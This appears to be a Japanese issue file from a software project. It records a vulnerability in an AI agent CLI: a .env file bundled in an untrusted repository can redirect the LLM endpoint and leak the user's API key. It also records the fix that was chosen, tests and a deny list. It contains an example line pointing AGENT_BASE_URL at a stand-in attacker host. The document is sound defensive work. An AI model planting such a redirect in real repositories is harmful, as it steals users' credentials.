---
title: リポジトリ同梱の .env で LLM の接続先を差し替えられ、実環境の API キーが他人のホストへ送られる
created: 2026-11-08
urgency: medium
importance: xhigh
priority: P1
started: 2026-11-08
completed: 2026-11-08
scope: [cli, infrastructure, docs]
---

# リポジトリ同梱の .env で LLM の接続先を差し替えられ、実環境の API キーが他人のホストへ送られる

## As-is（現状）

`agent` は起動時にカレントディレクトリから親へ辿って見つけた `.env` を読み、実環境に無いキーだけを
補います。能力を広げる変数（`AGENT_SHELL`、`AGENT_MCP_CONFIG`、`HTTPS_PROXY` など）は
`.env` からは設定できないようになりましたが、**接続先は設定できます**。

- 操作者が `AGENT_API_KEY`（または `AGENT_PROVIDER_<ALIAS>_API_KEY`）をシェルの実環境に置き、
  接続先は既定のまま（`AGENT_BASE_URL` 未設定）で使っているとする
- 他人のリポジトリを clone し、その中で `agent` を起動する
- 同梱の `.env` に `AGENT_BASE_URL=https://attacker.example` があれば、**最初のリクエストで
  API キーがそのホストへ送られます。** モデルの行動も承認も要りません
- 同じ理由で `HTTPS_PROXY` / `SSL_CERT_FILE` は既に拒否対象になっており、接続先そのものが
  素通りなのは一貫していません
- 小さい関連: `.env` の `AGENT_SESSION_DIR` で、会話の原文（モデルが読んだファイルの中身を含む）
  の書き出し先を変えられます

`make` 経由（compose の `env_file`）では `.env` は操作者のもので実環境として渡るため、この経路は
**`agent` バイナリを信頼できないリポジトリで直接起動したときだけ**です。ただしそれは CLI として
配布したときの主な使い方です。

## To-be（あるべき姿）

- 他人のリポジトリで `agent` を起動しても、自分の API キーが自分の指定していないホストへ
  送られることはない
- `.env` が接続先を変えようとして無視された場合は、起動時の警告で分かる
  （既存の「ignored from .env」警告と同じ形）
- 自分のプロジェクトで `.env` に接続先とキーを両方書く使い方（`make setup` の想定）は今までどおり動く

## 影響範囲

- **クレート**: `cli/src/dotenv.rs`（`DENIED` と `apply`。判断は純粋関数で、テストもここ）、
  `cli/src/main.rs`（`load_dotenv`）。方針次第で `infrastructure/src/config/env.rs`
  （`Keys::unaliased` / `for_alias` の base URL と API キーの組）
- **不変条件**: なし（`.env` の扱いは invariants.md の項目ではない。ただしセキュリティ境界）
- **設定・ドキュメント**: `README.md` §8 の「`.env` から設定できない変数」の表と理由、
  `.env.example`（接続先とキーは同じ所に書く、という注記が要るなら）、
  `crates/cli/tests/dotenv_e2e.rs`
- **利用者への影響**: 方針によっては破壊的。「実環境にキー・`.env` に接続先」という分け方を
  している利用者は、接続先を実環境へ移す必要が出る（起動時の警告で案内する）

## 達成条件

- [x] 方針（下のメモの 3 案から 1 つ、または組み合わせ）を決め、理由をメモに残す
- [x] 実環境にだけ API キーがあり、`.env` に `AGENT_BASE_URL` があるとき、その URL へ
      キーが送られないことを `dotenv.rs` の単体テストで固定する
- [x] 同じことを別名プロバイダ（`AGENT_PROVIDER_<ALIAS>_BASE_URL`）でも固定する。
      `.env` が新しい別名（`_KIND` / `_BASE_URL` / ルート）を定義して、実環境のキーを持つ
      既存プロバイダの宛先を差し替えられないことも含む
- [x] `.env` に接続先とキーを両方書く従来の使い方が動き続けることを固定する
- [x] 無視した場合に警告が出る
- [x] `AGENT_SESSION_DIR` の扱いを決め、決めた内容がテストか README に残っている
- [x] README §8 が実装と一致している
- [x] `make check` が緑

## 優先度の根拠

操作の要らない秘密の持ち出しで、配布後の主な使い方（clone したリポジトリで直接起動）で起きます
（重要度 `xhigh`）。まだ配布前で実害は出ていないが、利用者がつく前に `.env` の意味を変える方が
移行コストが小さい（緊急度 `medium`）。score 10 → P1。

## メモ

- 案（レビューで挙がったもの）
  1. **どれか 1 つでもキーが実環境から来ているなら、`.env` の接続先キーを無視する**。
     自分のプロジェクトで両方 `.env` に書く使い方は壊れない。判断材料は `apply` が既に受け取って
     いる「実環境にあるか」で足りるが、プロバイダの別名一覧（`AGENT_PROVIDERS` 等）を知る必要がある
  2. **接続先とキーは同じ出どころからのみ**。プロバイダごとに組で判定する。一番素直だが、
     `dotenv.rs` がプロバイダの組を知る必要があり、設定の知識が cli に漏れる
  3. **ドキュメントのみ**。`HTTPS_PROXY` を拒否している現状と釣り合わないので非推奨
- 既定の接続先がある（`AGENT_BASE_URL` 未設定で動く）プロバイダ種別ほど危ない。
  Ollama のようにキー不要の構成では持ち出す物がない
- `AGENT_SESSION_DIR`: 書き出し先を共有ディレクトリにされると、会話の原文が他ユーザーから
  読める場所に置かれうる。ワークスペースルートの指定は既に起動エラー
  （`done/2026-11-08_secret-file-protection.md`）。`DENIED` に足すのが最小
- 関連: `done/2026-11-08_secret-file-protection.md`（モデルによる `.env` の書き換えは既に拒否。
  本 issue はリポジトリに最初から置かれた `.env` の話）
- 出典: 2026-11-08 のレビュー（security）で見送ったもの
- **決定（2026-11-08, root）: 案 1 を採用。** 実環境に資格情報（`AGENT_API_KEY` / `OPENAI_API_KEY` /
  `ANTHROPIC_API_KEY` / `AGENT_PROVIDER_*_API_KEY`、空値は数えない）が 1 つでもあるとき、`.env` の
  接続先キー（`AGENT_PROVIDER` / `AGENT_BASE_URL` / `AGENT_MODEL` / `AGENT_OPENAI_MAX_TOKENS_FIELD` /
  `AGENT_PROVIDERS` / `AGENT_DEFAULT_PROVIDER` / `AGENT_PROVIDER_*` / `AGENT_ROUTER` / `AGENT_ROUTE_*` /
  `AGENT_FAILOVER*`）をすべて無視し、警告に名前を出す。案 2 と違いプロバイダの組の知識を cli に
  持ち込まず、別名の新設（`AGENT_PROVIDERS` + vendor キーのフォールバック）も同じ規則で塞がる。
  `AGENT_MODEL` は単独では送り先を変えないが、同じプロバイダ設定の組なので一貫性を優先した。
  `AGENT_SESSION_DIR` は `DENIED` に追加（保持期間による削除をワークスペース外へ及ぼせるため）。
  実装は `crates/cli/src/dotenv.rs`（`is_credential` / `is_connection` / `holds_credential` / `apply`）、
  実バイナリでの確認は `crates/cli/tests/dotenv_e2e.rs`（モックサーバ 2 台）。
